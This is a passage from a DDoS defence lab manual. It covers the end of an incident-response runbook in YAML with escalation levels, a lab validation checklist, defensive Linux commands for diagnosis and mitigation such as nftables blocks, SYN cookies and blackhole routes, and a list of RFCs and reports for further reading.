    bandwidth_alert: "FILL: bps threshold"
    http_rps_alert: "FILL: RPS threshold"
    conntrack_alert: "80% of nf_conntrack_max"

response_levels:
  level_1_local:
    trigger: "Attack within local mitigation capacity"
    actions:
      - "Verify alert is genuine (multi-source confirmation)"
      - "Classify attack vector (use decision tree in section 8.6)"
      - "Apply appropriate mitigation script (section 9.3)"
      - "Monitor effectiveness for 5 minutes"
    scripts:
      - "/opt/ddos/emergency_ddos_mitigate.sh syn_flood"
      - "/opt/ddos/emergency_ddos_mitigate.sh udp_flood <target_ip>"
      - "/opt/ddos/emergency_ddos_mitigate.sh http_flood"
    escalate_if: "Service still degraded after 5 minutes"

  level_2_isp:
    trigger: "Attack saturates upstream link"
    actions:
      - "Contact ISP NOC (use template in section 9.2)"
      - "Request upstream filtering or RTBH"
      - "Request clean-pipe activation if contracted"
    contacts:
      isp_noc: "FILL: ISP NOC number"
      circuit_id: "FILL: Your circuit ID"
    escalate_if: "ISP cannot mitigate within 15 minutes"

  level_3_cloud:
    trigger: "Attack exceeds ISP mitigation capacity"
    actions:
      - "Activate cloud scrubbing (BGP diversion)"
      - "Verify traffic flowing through scrubbing center"
      - "Confirm origin receiving clean traffic"
    provider: "FILL: Scrubbing provider name"
    activation: "FILL: Activation procedure (manual/automated)"

  level_4_emergency:
    trigger: "Multi-vector attack, all mitigation insufficient"
    actions:
      - "Business decision: RTBH target IP"
      - "Geographic blocking of non-essential regions"
      - "Failover to static maintenance page"
    approval_required: "FILL: Who approves nuclear options"

communication:
  internal:
    channel: "FILL: Incident Slack/Teams channel"
    update_frequency: "Every 15 minutes during active attack"
  external:
    status_page: "FILL: Status page URL"
    template: "See section 9.2 status page template"
  law_enforcement:
    threshold: "Attack duration > 4 hours OR confirmed extortion"
    contact: "FILL: Cybercrime unit contact"
    evidence_script: "/opt/ddos/ddos_evidence_capture.sh"

post_incident:
  timeline: "Post-mortem within 48 hours"
  template: "See section 9.1 Phase 6"
  distribution: "Security team, NOC, engineering leads, management"
```

### 10.8 Lab Validation Checklist

After completing all exercises, verify:

```
□ SYN flood successfully mitigated by SYN cookies + rate limiting
□ Slowloris attack neutralized by nginx timeout configuration
□ UDP flood handled by nftables rate limiting
□ HTTP flood managed by nginx limit_req + fail2ban
□ Monitoring dashboard shows attack metrics clearly
□ Alerts fired correctly during attacks
□ Service remained available during mitigated attacks
□ Response time degradation < 50% during mitigated attacks
□ Threshold values documented for production deployment
□ Runbook completed with site-specific details
□ Evidence collection script tested and producing valid output
□ All defense scripts tested and version-controlled
```

---

## Appendice A — Quick Reference Commands

### Immediate Response Commands

```bash
# Check if under attack right now
ss -tn state syn-recv | wc -l              # SYN flood indicator (>1000 = suspicious)
cat /proc/sys/net/netfilter/nf_conntrack_count  # Conntrack exhaustion
ss -tn | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -20  # Top source IPs

# Quick block of attacking source
nft add element inet ddos_defense blacklist { 198.51.100.50 timeout 1h }

# Emergency SYN protection
sysctl -w net.ipv4.tcp_syncookies=1

# Null route target under attack (sacrifice one IP to save others)
ip route add blackhole 203.0.113.50/32

# Check iptables/nftables drop counters
nft list ruleset | grep -A1 "counter"
iptables -nvL | grep -i drop
```

### Diagnostic Commands

```bash
# Traffic by protocol
ss -s

# Conntrack usage percentage
echo "scale=2; $(cat /proc/sys/net/netfilter/nf_conntrack_count) * 100 / $(cat /proc/sys/net/netfilter/nf_conntrack_max)" | bc

# Top connections by state
ss -tan | awk '{print $1}' | sort | uniq -c | sort -rn

# Network interface packet rate (watch for spikes)
sar -n DEV 1 5

# Check for SYN cookie activation in kernel log
dmesg | grep -i "possible SYN flooding"
```

---

## Appendice B — Further Reading

- RFC 2827 (BCP38): Network Ingress Filtering — defeating IP spoofing
- RFC 3704 (BCP84): Ingress Filtering for Multihomed Networks
- RFC 4987: TCP SYN Flooding Attacks and Common Mitigations
- RFC 5575: Dissemination of Flow Specification Rules (BGP Flowspec)
- RFC 5635: Remote Triggered Black Hole Filtering with uRPF
- RFC 7999: BLACKHOLE Community
- RFC 8198: Aggressive Use of DNSSEC-Validated Cache (NSEC/NSEC3)
- NIST SP 800-189: Resilient Interdomain Traffic Exchange
- US-CERT: Understanding Denial-of-Service Attacks
- Cloudflare DDoS Threat Report (quarterly) — https://radar.cloudflare.com/reports/ddos
- Arbor Networks Annual Worldwide Infrastructure Security Report
- OWASP: Denial of Service Cheat Sheet
